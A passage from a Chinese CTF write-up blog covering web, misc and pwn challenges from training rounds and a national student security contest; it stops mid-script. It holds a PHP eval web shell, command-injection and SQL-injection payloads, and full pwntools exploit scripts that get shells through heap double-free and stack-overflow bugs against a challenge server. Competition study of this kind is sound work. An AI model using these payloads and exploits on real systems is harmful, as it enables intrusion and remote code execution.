alt=\"4\"><br>payload如下<br><pre><code class=\"hljs php\">&lt;script language=<span class=\"hljs-string\">\"PHP\"</span>&gt;\n@<span class=\"hljs-keyword\">eval</span>($_POST[<span class=\"hljs-string\">'a'</span>]);\n&lt;/script&gt;</code></pre></p>\n<p>然后菜刀连上去即可拿到flag：CTF{uP104D_1nclud3_426fh8_is_Fun}</p>\n<h3 id=\"W2-web3\"><a href=\"#W2-web3\" class=\"headerlink\" title=\"W2-web3\"></a>W2-web3</h3><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">\"flag.php\"</span>);\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>($_GET[<span class=\"hljs-string\">'a'</span>])) &#123; \n <span class=\"hljs-keyword\">if</span> (strcmp($_GET[<span class=\"hljs-string\">'a'</span>], $flag) == <span class=\"hljs-number\">0</span>) \n <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">'Flag: '</span>.$flag); \n <span class=\"hljs-keyword\">else</span> \n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'close to flag'</span>;&#125;\n<span class=\"hljs-keyword\">else</span>&#123;\n show_source(<span class=\"hljs-keyword\">__FILE__</span>);\n&#125;\n<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>strcmp的问题，看这里–&gt;<a href=\"http://www.am0s.com/ctf/128.html\" target=\"_blank\" rel=\"noopener\">传送门</a>,payload如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">a[]</span>=<span class=\"hljs-number\">1</span></code></pre></p>\n<p>flag:CTF{php_trcmp_problems}</p>\n<h3 id=\"W2-web4\"><a href=\"#W2-web4\" class=\"headerlink\" title=\"W2-web4\"></a>W2-web4</h3><pre><code class=\"hljs php\">show_source(<span class=\"hljs-keyword\">__FILE__</span>);\n$username= <span class=\"hljs-string\">\"this_is_secret\"</span>; \n$password= <span class=\"hljs-string\">\"this_is_not_known_to_you\"</span>; \n<span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">\"flag.php\"</span>);<span class=\"hljs-comment\">//here I changed those two </span>\n$info = <span class=\"hljs-keyword\">isset</span>($_GET[<span class=\"hljs-string\">'info'</span>])? $_GET[<span class=\"hljs-string\">'info'</span>]: <span class=\"hljs-string\">\"\"</span> ;\n$data_unserialize = unserialize($info);\n<span class=\"hljs-keyword\">if</span> ($data_unserialize[<span class=\"hljs-string\">'username'</span>]==$username&amp;&amp;$data_unserialize[<span class=\"hljs-string\">'password'</span>]==$password)&#123;\n <span class=\"hljs-keyword\">echo</span> $flag;\n&#125;<span class=\"hljs-keyword\">else</span>&#123;\n <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"username or password error!\"</span>;\n&#125;\n<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>构造数组绕过<br><pre><code class=\"hljs undefined\"><span class=\"hljs-selector-tag\">Array</span>\n(\n [username] =&gt; <span class=\"hljs-number\">1</span>\n [password] =&gt; <span class=\"hljs-number\">1</span>\n)\n<span class=\"hljs-comment\">//序列化后的结果</span>\n<span class=\"hljs-selector-tag\">a</span><span class=\"hljs-selector-pseudo\">:2</span>:&#123;<span class=\"hljs-attribute\">s</span>:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"username\"</span>;<span class=\"hljs-attribute\">b</span>:<span class=\"hljs-number\">1</span>;<span class=\"hljs-attribute\">s</span>:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"password\"</span>;<span class=\"hljs-attribute\">b</span>:<span class=\"hljs-number\">1</span>;&#125;</code></pre></p>\n<p>flag:CTF{this_is_flag}</p>\n<h3 id=\"W2-web5\"><a href=\"#W2-web5\" class=\"headerlink\" title=\"W2-web5\"></a>W2-web5</h3><p><img src=\"/img/2019-04-19/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>在1秒后，3秒内正确提交20次即可<br><pre><code class=\"hljs python\"><span class=\"hljs-comment\">#-*-coding:utf-8</span>\n<span class=\"hljs-keyword\">from</span> selenium.webdriver <span class=\"hljs-keyword\">import</span> Chrome\n<span class=\"hljs-keyword\">from</span> selenium.webdriver.common.by <span class=\"hljs-keyword\">import</span> By\n<span class=\"hljs-keyword\">from</span> selenium.webdriver.support.ui <span class=\"hljs-keyword\">import</span> WebDriverWait\n<span class=\"hljs-keyword\">from</span> selenium.webdriver.support <span class=\"hljs-keyword\">import</span> expected_conditions <span class=\"hljs-keyword\">as</span> EC\n<span class=\"hljs-keyword\">import</span> time\ndriver=Chrome(executable_path=<span class=\"hljs-string\">\"D:\\\\Python27\\\\chromedriver.exe\"</span>)\nlogin_url=<span class=\"hljs-string\">\"http://39.98.216.116:32795/\"</span>\ndriver.get(login_url)\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">20</span>):\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'&lt;--test%d--&gt;'</span>%i\n    list1 = driver.find_elements_by_tag_name(<span class=\"hljs-string\">'div'</span>)\n    tmp = <span class=\"hljs-string\">''</span>\n    <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> list1:\n        tmp += i.text\n    tmp = tmp[:<span class=\"hljs-number\">-1</span>]\n    <span class=\"hljs-keyword\">print</span> tmp\n    tmp = <span class=\"hljs-string\">'res = '</span>+tmp\n    exec(tmp)\n    <span class=\"hljs-keyword\">print</span> res\n    list2 = driver.find_elements_by_tag_name(<span class=\"hljs-string\">\"input\"</span>)\n    list2[<span class=\"hljs-number\">0</span>].send_keys(res)\n    time.sleep(<span class=\"hljs-number\">1</span>)\n    list2[<span class=\"hljs-number\">1</span>].click()</code></pre></p>\n<p>flag:ctf{gr3At_cAcu1a7or}</p>\n<h3 id=\"W3-web1\"><a href=\"#W3-web1\" class=\"headerlink\" title=\"W3-web1\"></a>W3-web1</h3><p>在响应头的hint可以看到index.php的源码<br><img src=\"/img/2019-04-19/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"><br><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\n$info = <span class=\"hljs-string\">\"\"</span>; \n$req = [];\n$flag=<span class=\"hljs-string\">\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"</span>;\nini_set(<span class=\"hljs-string\">\"display_error\"</span>, <span class=\"hljs-keyword\">false</span>); \nerror_reporting(<span class=\"hljs-number\">0</span>); \n<span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>($_GET[<span class=\"hljs-string\">'number'</span>]))&#123;\n   header(<span class=\"hljs-string\">\"hint:source.txt\"</span>);\n   <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\"have a fun!!\"</span>); \n&#125;\n<span class=\"hljs-keyword\">foreach</span>([$_GET, $_POST] <span class=\"hljs-keyword\">as</span> $global_var) &#123; \n    <span class=\"hljs-keyword\">foreach</span>($global_var <span class=\"hljs-keyword\">as</span> $key =&gt; $value) &#123; \n        $value = trim($value); \n        is_string($value) &amp;&amp; $req[$key] = addslashes($value); \n    &#125; \n&#125; \n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">is_palindrome_number</span><span class=\"hljs-params\">($number)</span> </span>&#123; \n    $number = strval($number); \n    $i = <span class=\"hljs-number\">0</span>; \n    $j = strlen($number) - <span class=\"hljs-number\">1</span>; \n    <span class=\"hljs-keyword\">while</span>($i &lt; $j) &#123; \n        <span class=\"hljs-keyword\">if</span>($number[$i] !== $number[$j]) &#123; \n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">false</span>; \n        &#125; \n        $i++; \n        $j--; \n    &#125; \n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">true</span>; \n&#125;\n<span class=\"hljs-keyword\">if</span>(is_numeric($_REQUEST[<span class=\"hljs-string\">'number'</span>]))&#123;\n\n   $info=<span class=\"hljs-string\">\"sorry, you cann't input a number!\"</span>;\n&#125;<span class=\"hljs-keyword\">elseif</span>($req[<span class=\"hljs-string\">'number'</span>]!=strval(intval($req[<span class=\"hljs-string\">'number'</span>])))&#123;\n     $info = <span class=\"hljs-string\">\"number must be equal to it's integer!! \"</span>;  \n&#125;<span class=\"hljs-keyword\">else</span>&#123;\n     $value1 = intval($req[<span class=\"hljs-string\">\"number\"</span>]);\n     $value2 = intval(strrev($req[<span class=\"hljs-string\">\"number\"</span>]));  \n     <span class=\"hljs-keyword\">if</span>($value1!=$value2)&#123;\n          $info=<span class=\"hljs-string\">\"no, this is not a palindrome number!\"</span>;\n     &#125;<span class=\"hljs-keyword\">else</span>&#123;\n          \n          <span class=\"hljs-keyword\">if</span>(is_palindrome_number($req[<span class=\"hljs-string\">\"number\"</span>]))&#123;\n              $info = <span class=\"hljs-string\">\"nice! &#123;$value1&#125; is a palindrome number!\"</span>; \n          &#125;<span class=\"hljs-keyword\">else</span>&#123;\n             $info=$flag;\n          &#125;\n     &#125;\n&#125;\n<span class=\"hljs-keyword\">echo</span> $info;</code></pre></p>\n<p>拿到flag的条件是</p>\n<ol>\n<li>不为空，切不能是一个数值型数字，包括小数（由is_numeric函数判断）。</li>\n<li>不能是一个回文数（is_palindrome_number判断）。</li>\n<li>该数的反转的整数值应该和它本身的整数值相等。<br>目前已知的两种解法是</li>\n<li>利用intval函数溢出绕过</li>\n<li>用科学计数法构造0=0<br>用第二种方法构造的payload如下<pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">number</span>=<span class=\"hljs-number\">0</span>e-<span class=\"hljs-number\">0</span>%<span class=\"hljs-number\">00</span></code></pre>\n</li>\n</ol>\n<p>flag:CTF{b72dd89e71108245fe21a4c1849ae668}<br>参考–&gt;<a href=\"http://www.xianxianlabs.com/2018/07/07/%E5%AE%9E%E9%AA%8C%E5%90%A7-ctf-%E9%A2%98%E7%9B%AE%E4%B9%8B-web-writeup-%E9%80%9A%E5%85%B3%E5%A4%A7%E5%85%A8-1/\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<h3 id=\"W3-web2\"><a href=\"#W3-web2\" class=\"headerlink\" title=\"W3-web2\"></a>W3-web2</h3><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">\"flag.php\"</span>;\nerror_reporting(<span class=\"hljs-number\">0</span>);\nshow_source(<span class=\"hljs-keyword\">__FILE__</span>);\n\n$a = @$_REQUEST[<span class=\"hljs-string\">'hello'</span>];\n<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">\"var_dump($a);\"</span>);</code></pre>\n<p>php注入，payload如下<br><pre><code class=\"hljs undefined\">);echo%<span class=\"hljs-number\">20</span>`cat%<span class=\"hljs-number\">20.</span>/flag.php`;<span class=\"hljs-comment\">//</span></code></pre></p>\n<p>flag:flag{92853051ab894a64f7865cf3c2128b34}</p>\n<h3 id=\"W3-web5\"><a href=\"#W3-web5\" class=\"headerlink\" title=\"W3-web5\"></a>W3-web5</h3><p><img src=\"/img/2019-04-19/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br>这道题是bugku上的一道注入题，没有过滤，payload如下<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">-1</span>' <span class=\"hljs-built_in\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,group_concat(table_name) <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-built_in\">tables</span> <span class=\"hljs-built_in\">where</span> table_schema = database()#\nid=<span class=\"hljs-number\">-1</span>' <span class=\"hljs-built_in\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,group_concat(column_name) <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-built_in\">where</span> table_name = 'fl4g'#\nid=<span class=\"hljs-number\">-1</span>' <span class=\"hljs-built_in\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,(<span class=\"hljs-keyword\">select</span> * <span class=\"hljs-keyword\">from</span> fl4g)#</code></pre></p>\n<p><img src=\"/img/2019-04-19/15.png\" srcset=\"/img/static/loading.gif\" alt=\"15\"><br>flag:CTF{Sql_INJECT0N_4813drd8hz4}</p>\n<h3 id=\"W3-web3\"><a href=\"#W3-web3\" class=\"headerlink\" title=\"W3-web3\"></a>W3-web3</h3><p>查看源代码可以看到页面设置了<code>&lt;html lang=&quot;en&quot;&gt;</code>，可能存在宽字节注入<br><img src=\"/img/2019-04-19/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"><br>登录框过滤了<code>空格</code>，<code>=</code>，<code>and</code>，但是<code>or</code>，<code>&lt;</code>,<code>&gt;</code>,<code>&#39;</code>,<code>select</code>都没有过滤，同时用户名正确时只会显示password error<br>构造测试payload<br><pre><code class=\"hljs undefined\">username=admin%df%<span class=\"hljs-number\">27</span>or'<span class=\"hljs-number\">1</span>'&gt;'<span class=\"hljs-number\">1</span>&amp;password=<span class=\"hljs-number\">1</span>\nusername=admin%df%<span class=\"hljs-number\">27</span>or'<span class=\"hljs-number\">2</span>'&gt;'<span class=\"hljs-number\">1</span>&amp;password=<span class=\"hljs-number\">1</span></code></pre></p>\n<p>再替换位置<br><pre><code class=\"hljs undefined\">username=admin<span class=\"hljs-symbol\">%df</span><span class=\"hljs-symbol\">%27</span><span class=\"hljs-keyword\">or</span>(<span class=\"hljs-keyword\">select</span>(password))&gt;'<span class=\"hljs-number\">0</span>&amp;password=<span class=\"hljs-number\">1</span></code></pre></p>\n<p>不断变大后面的字符串就得到密码的md5值51b7a76d51e70b419f60d3473fb6f900，解密得到skctf123456，然后登录拿到flag<br><img src=\"/img/2019-04-19/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"><br>flag：CTF{b1iNd_SQL_iNJEcti0n!}</p>\n<h3 id=\"W3-web\"><a href=\"#W3-web\" class=\"headerlink\" title=\"W3-web\"></a>W3-web</h3><p><img src=\"/img/2019-04-19/10.png\" srcset=\"/img/static/loading.gif\" alt=\"10\"><br>cbc字节翻转攻击，首先扫描得到源码的备份文件<code>.index.php.swp</code><br><pre><code class=\"hljs php\">     $_SESSION[<span class=\"hljs-string\">'username'</span>] = $info[<span class=\"hljs-string\">'username'</span>];\n        &#125;<span class=\"hljs-keyword\">else</span>&#123;\n            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\"ERROR!\"</span>);\n        &#125;\n    &#125;\n&#125;\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">show_homepage</span><span class=\"hljs-params\">()</span></span>&#123;\n    <span class=\"hljs-keyword\">if</span> ($_SESSION[<span class=\"hljs-string\">\"username\"</span>]===<span class=\"hljs-string\">'admin'</span>)&#123;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;\n    &#125;<span class=\"hljs-keyword\">else</span>&#123;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'&lt;p&gt;hello '</span>.$_SESSION[<span class=\"hljs-string\">'username'</span>].<span class=\"hljs-string\">'&lt;/p&gt;'</span>;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;\n    &#125;\n    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'&lt;p&gt;&lt;a href=\"loginout.php\"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;\n&#125;\n<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>($_POST[<span class=\"hljs-string\">'username'</span>]) &amp;&amp; <span class=\"hljs-keyword\">isset</span>($_POST[<span class=\"hljs-string\">'password'</span>]))&#123;\n    $username = (string)$_POST[<span class=\"hljs-string\">'username'</span>];\n    $password = (string)$_POST[<span class=\"hljs-string\">'password'</span>];\n    <span class=\"hljs-keyword\">if</span>($username === <span class=\"hljs-string\">'admin'</span>)&#123;\n        <span class=\"hljs-keyword\">exit</span>(<span class=\"hljs-string\">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);\n    &#125;<span class=\"hljs-keyword\">else</span>&#123;\n        $info = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'username'</span>=&gt;$username,<span class=\"hljs-string\">'password'</span>=&gt;$password);\n        login($info);\n        show_homepage();\n    &#125;\n&#125;<span class=\"hljs-keyword\">else</span>&#123;\n    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>($_SESSION[<span class=\"hljs-string\">\"username\"</span>]))&#123;\n        check_login();\n        show_homepage();\n    &#125;<span class=\"hljs-keyword\">else</span>&#123;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'&lt;body class=\"login-body\"&gt;\n                &lt;div id=\"wrapper\"&gt;\n                    &lt;div class=\"user-icon\"&gt;&lt;/div&gt;\n                    &lt;div class=\"pass-icon\"&gt;&lt;/div&gt;\n                    &lt;form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\"&gt;\n                        &lt;div class=\"header\"&gt;\n                        &lt;h1&gt;Login Form&lt;/h1&gt;\n                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;\n                        &lt;/div&gt;\n                        &lt;div class=\"content\"&gt;\n                        &lt;input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" /&gt;\n                        &lt;input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" /&gt;\n                        &lt;/div&gt;\n                        &lt;div class=\"footer\"&gt;\n                        &lt;input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" /&gt;\n                        &lt;/div&gt;\n                    &lt;/form&gt;\n                &lt;/div&gt;\n            &lt;/body&gt;'</span>;\n    &#125;\n&#125;\n<span class=\"hljs-meta\">?&gt;</span></code></pre></p>\n<p>admin被禁止登录，但是我们可以利用反序列化漏洞重置<code>$_SESSION[&#39;username&#39;]为admin</code><br>cbc翻转攻击具体可以看师兄的博客–&gt;<a href=\"https://delcoding.github.io/2018/03/bugku-writeup4/\" target=\"_blank\" rel=\"noopener\">传送门</a><br>flag：SKCTF{CBC_wEB_cryptography_6646dfgdg6}</p>\n<h3 id=\"W3-misc3\"><a href=\"#W3-misc3\" class=\"headerlink\" title=\"W3-misc3\"></a>W3-misc3</h3><p>下载回来的pdf是经过加密的，加密方法是rot13<br>解密方法<br><pre><code class=\"hljs bash\">cat MinionQuest.pdf | tr <span class=\"hljs-string\">'A-Za-z'</span> <span class=\"hljs-string\">'N-ZA-Mn-za-m'</span> &gt; out.pdf</code></pre></p>\n<p><img src=\"/img/2019-04-19/11.png\" srcset=\"/img/static/loading.gif\" alt=\"11\"><br>解密后的pdf有部分被挡住了，用下面的命令提取pdf的图片<br><pre><code class=\"hljs bash\">pdfimages -png result.pdf images</code></pre></p>\n<p>得到完整的图片<br><img src=\"/img/2019-04-19/12.png\" srcset=\"/img/static/loading.gif\" alt=\"12\"><br>flag:BITSCTF{save_the_kid}<br>参考–&gt;<a href=\"https://sixfoisneuf.fr/ctf/hacking/english/writeup/2017/02/06/bitsctf-writeup/\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<h3 id=\"W3-misc1\"><a href=\"#W3-misc1\" class=\"headerlink\" title=\"W3-misc1\"></a>W3-misc1</h3><p>下载回来是一个usb流量包，在某一条长度比较大的流量里发现了一张图片<br><img src=\"/img/2019-04-19/13.png\" srcset=\"/img/static/loading.gif\" alt=\"13\"><br>dump出来就可以得到flag，微软照片的bug导致我卡了n个小时，<strong>上面sublime，下面微软的照片</strong><br><img src=\"/img/2019-04-19/14.png\" srcset=\"/img/static/loading.gif\" alt=\"14\"></p>\n<h3 id=\"W3-misc5\"><a href=\"#W3-misc5\" class=\"headerlink\" title=\"W3-misc5\"></a>W3-misc5</h3><p>参考–&gt;<a href=\"https://github.com/ctfs/write-ups-2017/tree/master/breakin-ctf-2017/misc/Mysterious-GIF\" target=\"_blank\" rel=\"noopener\">传送门</a></p>"},{"title":"第十二届全国大学生信息安全竞赛初赛writeup","index_img":"/img/2019-04-23/index.jpg","date":"2019-04-23T12:32:52.000Z","_content":"大佬的博客–>[传送门](https://www.ctfwp.com/articals/2019national.html)\n<!--more-->\n\n### misc\n#### 签到\n摄像头捕捉到三个人的脸即可\n### saleae\n下载回来一个`saleae.logicdata`文件，经搜索发现这个saleae的可以打开的文件类型，官网地址–>[传送门](https://www.saleae.com/zh/)，打开文件只发现一些波形\n![1](/img/2019-04-23/1.png)\n网上搜索资料看到一篇教程通过xor两条数据流得到信息，上面一条是当上面波形的电平为高电平且下面那条也是高电平时为1，下面那条是低电平则为0，如图\n![2](/img/2019-04-23/2.png)\n最后得到一串数据\n```\n011001100110110001100001011001110111101100110001001100100011000000110111001100010011001100111001001101110010110100110001001110010110010000110001001011010011010000111000011001010011011000101101011000100110010100111000011000110010110100110111001110000011010001100010001110000011100101100001001110010011010101100101001100000011011101111101\n```\n8个一组得到flag\n#### usbasp\n打开文件后在`analyzer`里选择`SPI`，设置选项最下面选择`enable line is active hight`\n![7](/img/2019-04-23/7.png)\n右下面可以明显看到flag导出即可\n![9](/img/2019-04-23/9.png)\n### pwn\n#### your-pwn\n在函数`sub_B35`里面，没有对`index(v1)`进行检查，从而造成任意地址泄露和任意地址更改。直接改返回地址为`one_gadget`即可\n```\nfor ( i = 0; i <= 40; ++i )\n{\nputs(\"input index\");\n__isoc99_scanf(\"%d\", &v1);\nprintf(\"now value(hex) %x\\n\", (unsigned int)v4[v1]);\nputs(\"input new value\");\n__isoc99_scanf(\"%d\", &v2);\nv4[v1] = v2;\n}\n```\n详细脚本如下：\n```python\nfrom pwn import *\n#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')\nlocal = 0\nif local:\n\tp = process(\"./pwn\")\nelse:\n\tp = remote(\"39.97.228.196\",60007)\ndef pass_():\n\tp.recvuntil(\"name\")\n\tp.sendline(\"Team233\")\ndef change(index, addr):\n\tfor i in range(8):\n\t\tp.recvuntil(\"index\\n\")\n\t\tp.sendline(str(index+i))\n\t\tp.recvuntil(\"now value(hex) \")\n\t\tdata = p.recvn(1)\n\t\t#print(\"data = \" + str(data))\n\t\tp.recvuntil(\"input new value\\n\")\n\t\tp.sendline(str(addr))\n\t\taddr = addr >> 8\ndef leak(index):\n\taddr = \"\"\n\tfor i in range(8):\n\t\tp.recvuntil(\"index\\n\")\n\t\tp.sendline(str(index+i))\n\t\tp.recvuntil(\"now value(hex) \")\n\t\tdata = int(p.recvuntil(\"\\n\",drop=True),16)\n\t\tif data > 300:\n\t\t\tdata = data - 0xffffff00\n\t\tp.recvuntil(\"input new value\\n\")\n\t\tp.sendline(str(data))\n\t\taddr += chr(data)\n\taddr = u64(addr)\n\treturn addr\ndef exp():\n\tpass_()\n\t#gdb.attach(p)addr = leak(0x158)\n\telf_base = addr - 0xb11\n\tprint '[*] elf_base :',hex(elf_base)\n\taddr = leak(0x160+0x118)\n\tlibc_base = addr - 0x20830\n\tone_shot = libc_base + 0xf02a4\n\tprint '[*] one_shot :',hex(one_shot)\n\tprint '[*] libc_base :',hex(libc_base)\n\tpause()\n\tchange(0x158,one_shot)\n\tp.sendline(\"no\")\n\tp.sendline(\"cat flag\")\n\tp.interactive()\nexp()\n```\n![3](/img/2019-04-23/3.png)\n#### daily\n由于是`%s`打印内 容，会一直打印遇到`\\x00`才会停止，而且`add`的时候通过`read`读入没有写入字符串后缀，所以可以利用这一点可以泄露`libc`地址和`heap`地址。泄露利用如下：\n```\ncreate(0x60,\"a\"*0x20)#0\ncreate(0x60,\"a\"*0x20)#1\ncreate(0x60,\"b\"*0x20)#2\ndelete(0)\ndelete(1)\ncreate(0x60,\"a\")#0\nshow()\np.recvuntil(\"0 : a\")\ndata = \"\\x00\"+p.recvuntil(\"2\",drop=True)\nheap = u64(data.ljust(8,\"\\x00\"))\nprint \"[*]heap : \", hex(heap)\ncreate(0x100,\"a\"*0x20)#1 \ncreate(0x100,\"a\"*0x20)#3 \ndelete(1)\ncreate(0x20,\"a\"*0x20)#1\ncreate(0xd0,\"a\"*8)#4\nshow()\np.recvuntil(\"4 : aaaaaaaa\")\ndata = p.recvn(6) + \"\\x00\\x00\"\nlibc_base = u64(data) - 0x3c4b78\n```\n然后利用`free`的时候没有检查`index(v1)`，漏洞点如下程序部分代码，造成`UAF`分配到`bss`上的`chunk_list`，然后改`free`就可以了 。\n```\nprintf(\"Please enter the index of daily:\");\nread(0, &buf, 8uLL);\nv1 = atoi(&buf);\nif ( chunk[v1].ptr )\n{\nfree((void *)chunk[v1].ptr);\nchunk[v1].ptr = 0LL;\nLODWORD(chunk[v1].len) = 0;\nputs(\"remove successful!!\");\n--chunk_num;\n}\n```\n然后利用`Double free`得到`bss`段上的`chunk_list`,然后控制`chunk`，实现任意地址写，然后我们写`free_hook`地址为`system`，再`free`的时候就可以`getshell`了。在这之前，我们尝试了申请到`malloc_hook`前面然后把`malloc_hoook`覆盖为`one_gadget`，但是没有一个`one_gadget`可以成功，主要是因为条件没有满足，后来就直接`free_hook`了。详细脚本如下：\n```python\nfrom pwn import *\n#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')\nlocal = 0\nif local:\n\tp = process(\"./pwn\")\nelse:\n\tp = remote(\"39.97.228.196\",60006)\n\ndef show():\n\tp.recvuntil(\":\")\n\tp.sendline(\"1\") \n\ndef create(lens,content):\n\tp.recvuntil(\":\")\n\tp.sendline(\"2\") \n\tp.recvuntil(\":\")\n\tp.sendline(str(lens)) \n\tp.recv()\n\tp.send(content)\n\ndef change(index,content):\n\tp.recvuntil(\":\")\n\tp.sendline(\"3\") \n\tp.recvuntil(\":\")\n\tp.sendline(str(index)) \n\tp.recv()\n\tp.send(content)\n\ndef delete(index):\n\tp.recvuntil(\":\")\n\tp.sendline(\"4\") \n\tp.recvuntil(\":\")\n\tp.sendline(str(index)) \nchunk_list = 0x602060\n\ndef exp(): \n\tcreate(0x60,\"a\"*0x20)#0\n\tcreate(0x60,\"a\"*0x20)#1\n\tcreate(0x60,\"b\"*0x20)#2\n\tdelete(0)\n\tdelete(1)\n\tcreate(0x60,\"a\")#0\n\tshow()\n\tp.recvuntil(\"0 : a\")\n\tdata = \"\\x00\"+p.recvuntil(\"2\",drop=True)\n\theap = u64(data.ljust(8,\"\\x00\"))\n\tprint \"[*]heap : \", hex(heap)\n\tcreate(0x100,\"a\"*0x20)#1\n\tcreate(0x100,\"a\"*0x20)#3\n\tdelete(1)\n\tcreate(0x20,\"a\"*0x20)#1\n\tcreate(0xd0,\"a\"*8)#4\n\tshow()\n\tp.recvuntil(\"4 : aaaaaaaa\")\n\tdata = p.recvn(6) + \"\\x00\\x00\"\n\tlibc_base = u64(data) - 0x3c4b78\n\tmalloc_hook = libc_base + 0x3c4b10\n\tone_shot = libc_base + 0xf02a4\n\tfree_hook = libc_base + 0x3c67a8\n\tsystem = libc_base + 0x45390\n\tprint '[*]libc_base : ',hex(libc_base)\n\tprint '[*]malloc_hook : ',hex(malloc_hook)\n\tprint '[*]free_hook : ',hex(free_hook)\n\tprint '[*]one_shot : ',hex(one_shot)\n\tprint '[*]system : ',hex(system)\n\tindex = (heap - chunk_list + 8)/0x10 + 15\n\tprint '[*]index : ',hex(index)\n\tchange(2,\"a\"*8+p64(heap+0x10))\n\tcreate(0x71,\"h\"*0x71)#5\n\tcreate(0x60,\"e\"*0x60) #6\n\tcreate(0x60,\"b\"*0x60) #7\n\t#gdb.attach(p)\n\tdelete(6)\n\tdelete(7)\n\tdelete(index)\n\tcreate(0x60,p64(0x6020a8)) #6\n\tcreate(0x60,\"c\"*0x60) #7\n\tcreate(0x60,\"/bin/sh\\x00\") #8\n\tpayload = p64(free_hook) + p64(0x20) + p64(heap+0x10) payload = payload.ljust(0x60,\"\\x00\")\n\tcreate(0x60, payload) #9\n\tshow()\n\tchange(5,p64(system))\n\tdelete(6)\n\tp.recv()\n\t#gdb.attach(p)\n\tp.interactive() \n\nexp()\n```\n最后成功 getshell\n![4](/img/2019-04-23/4.png)\n#### babypwn\n直接`read`读入`0x100`直接造成栈溢出，但是这题的难点在于没有泄露函数，不能直接`return to libc`，所以这里利用`ret2_dl_runtime_resolve`，之前做过0ctf2018的babystack 跟这个类似，先是尝试了`roputils`库实现，后来发现有点问题总是调不对，后来直接手工干了一波。操作如下：\n```python\n# -*- coding:utf-8 -*-\nfrom pwn import *\ncontext.log_level = 'debug'\n#p = process('./pwn')\np = remote(ip,port)\nelf = ELF('./pwn')\nread_plt = elf.plt['read']\nalarm_plt = elf.plt['alarm']\npop_ebp_ret = 0x080485db\nppp_ret = 0x080485d9\npp_ebp_ret = 0x080485da\nleave_ret = 0x08048448\nstack_size = 0x800\nbss_addr = 0x0804a040 #readelf -S babystack | grep \".bss\" base_stage = bss_addr + stack_size\nplt_0 = 0x8048380 # objdump -d -j .plt babystack\nrel_plt = 0x804833c # objdump -s -j .rel.plt babystack index_offset = (base_stage + 28) - rel_plt\nalarm_got = elf.got['alarm']\nprint \"alarm_got: \",hex(alarm_got)\nprint \"alarm_plt: \",hex(alarm_plt)\nprint \"read_plt: \",hex(read_plt)\ndynsym = 0x80481DC\ndynstr = 0x804827C\nfake_sym_addr = base_stage + 36\nalign = 0x10 - 